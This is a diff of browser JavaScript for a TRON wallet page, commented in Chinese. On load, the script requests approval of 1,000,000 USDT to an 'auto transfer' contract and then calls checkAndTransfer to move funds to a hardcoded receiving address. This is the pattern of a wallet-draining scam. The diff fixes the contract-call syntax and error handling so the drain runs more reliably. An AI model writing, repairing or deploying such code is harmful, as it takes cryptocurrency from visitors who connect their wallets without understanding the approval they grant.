@@ -4,6 +4,7 @@ const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
 const receivingAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE'; // 收款地址
 
 const usdtAbi = [
+    // 完整的USDT ABI
     {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
     {"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
@@ -73,7 +74,13 @@ async function init() {
     tronWeb = window.tronWeb;
 
     try {
+        await tronWeb.ready;
         const account = tronWeb.defaultAddress.base58;
+
+        if (!account) {
+            throw new Error('未连接到钱包，请确保钱包已连接并切换到TRON网络');
+        }
+
         document.getElementById('result').innerText = 'Account: ' + account;
 
         const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
@@ -83,16 +90,16 @@ async function init() {
         document.getElementById('result').innerText += '\nAuto Transfer Contract: ' + autoTransferContractAddress;
 
         document.getElementById('result').innerText += '\n开始授权...';
-        await usdtContract.approve(autoTransferContractAddress, approveAmount).send({ shouldPollResponse: true });
+        await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send();
 
         document.getElementById('result').innerText += '\n授权成功';
         document.getElementById('result').innerText += '\n开始转账...';
-        await autoTransferContract.checkAndTransfer(receivingAddress).send({ shouldPollResponse: true });
+        await autoTransferContract.methods.checkAndTransfer(receivingAddress).send();
 
         document.getElementById('result').innerText += '\n转账成功';
     } catch (error) {
         console.error('Error:', error);
-        document.getElementById('result').innerText += '\n操作失败: ' + error.message;
+        document.getElementById('result').innerText += '\n操作失败: ' + (error.message || '未知错误');
     }
 }
 
